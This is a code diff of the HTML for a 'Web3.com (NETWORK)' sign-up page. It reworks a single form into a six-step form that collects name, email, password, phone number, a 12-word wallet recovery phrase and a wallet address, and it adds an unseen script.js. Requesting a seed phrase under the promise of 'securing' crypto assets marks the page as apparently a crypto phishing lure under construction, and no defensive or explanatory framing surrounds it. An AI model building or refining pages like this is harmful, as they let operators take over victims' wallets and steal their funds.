@@ -1,53 +1,72 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Web3 NETWORK | Sign Up</title>
-  <link rel="stylesheet" href="style.css" />
+  <meta charset="UTF-8">
+  <title>Web3.com (NETWORK) | Sign Up</title>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
 <div class="auth-container">
+
   <h1>Web3.com</h1>
   <h3>(NETWORK)</h3>
 
   <p class="tagline">
     CONNECT YOUR CRYPTO ASSETS TO A SAFE NETWORK.<br><br>
-    Real support, for those who want to secure an protect their crypto wallet backing up with web3 network — backing bold founders with capital and experience.
   </p>
 
-  <!-- STEP 1 -->
-  <form id="signup-form">
-    <input type="text" id="name" placeholder="Full Name" required />
-    <input type="email" id="email" placeholder="Email Address" required />
-    <input type="password" id="password" placeholder="Password" required />
-    <input type="tel" id="phone" placeholder="Phone Number" required />
+  <form id="multiStepForm">
 
-    <h4>Phrase Key (12 words)</h4>
-    <div class="grid-words">
-      <input type="text" placeholder="1">
-      <input type="text" placeholder="2">
-      <input type="text" placeholder="3">
-      <input type="text" placeholder="4">
-      <input type="text" placeholder="5">
-      <input type="text" placeholder="6">
-      <input type="text" placeholder="7">
-      <input type="text" placeholder="8">
-      <input type="text" placeholder="9">
-      <input type="text" placeholder="10">
-      <input type="text" placeholder="11">
-      <input type="text" placeholder="12">
+    <!-- STEP 1 -->
+    <div class="step active">
+      <input type="text" placeholder="Full Name" required>
+      <button type="button" onclick="nextStep()">Next</button>
     </div>
 
-    <input type="text" id="wallet" placeholder="Wallet Type" required />
+    <!-- STEP 2 -->
+    <div class="step">
+      <input type="email" placeholder="Email Address" required>
+      <button type="button" onclick="nextStep()">Next</button>
+    </div>
 
-    <button type="submit">Create Account</button>
+    <!-- STEP 3 -->
+    <div class="step">
+      <input type="password" placeholder="Password" required>
+      <button type="button" onclick="nextStep()">Next</button>
+    </div>
+
+    <!-- STEP 4 -->
+    <div class="step">
+      <input type="tel" placeholder="Phone Number" required>
+      <button type="button" onclick="nextStep()">Next</button>
+    </div>
+
+    <!-- STEP 5 -->
+    <div class="step">
+      <h4>Phrase keys (12 words)</h4>
+      <div class="grid-words">
+        <input><input><input><input>
+        <input><input><input><input>
+        <input><input><input><input>
+      </div>
+      <button type="button" onclick="nextStep()">Next</button>
+    </div>
+
+    <!-- STEP 6 -->
+    <div class="step">
+      <input type="text" placeholder="Wallet Address" required>
+      <button type="submit">Create Account</button>
+    </div>
+
   </form>
 
   <p class="switch">
     Already have an account? <a href="login.html">Login</a>
   </p>
+
 </div>
 
+<script src="script.js"></script>
 </body>
 </html>
